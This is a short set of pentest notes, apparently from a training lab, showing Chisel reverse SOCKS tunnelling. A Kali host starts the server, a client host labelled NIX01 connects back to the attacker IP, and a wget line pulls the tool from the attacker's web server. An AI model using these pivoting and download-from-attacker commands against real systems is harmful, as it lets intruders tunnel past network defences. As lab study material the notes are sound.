### On Kali Machine
#chiselserver
```bash
┌──(root㉿kali)-[/opt/chisel]
└─# ./chisel_nix server --socks5 --reverse -p 1000
2023/08/10 12:41:50 server: Reverse tunnelling enabled
2023/08/10 12:41:50 server: Fingerprint 2IPANylYvmV2NdxK3rDm/Bejk8EcLWUKsJRzorLtz1c=
2023/08/10 12:41:50 server: Listening on http://0.0.0.0:1000

./chisel_1.8.1_linux_amd64  --socks5 --reverse -p 1000

./chisel_64 server --socks5 --reverse -p 1000
```

### On Client Machine 
#chiselclient
```bash
root@NIX01:~# ./chisel_64 client 10.10.14.39:1000 R:1080:socks
./chisel_64 client 10.10.14.39:1000 R:1080:socks
2023/08/10 09:43:05 client: Connecting to ws://10.10.14.39:1000
2023/08/10 09:43:06 client: Connected (Latency 27.77469ms)

./chisel_1.8.1_linux_amd64.exe client 10.10.14.39:1000 R:1080:socks
```

wget http://10.10.14.39:8000/chisel_64.



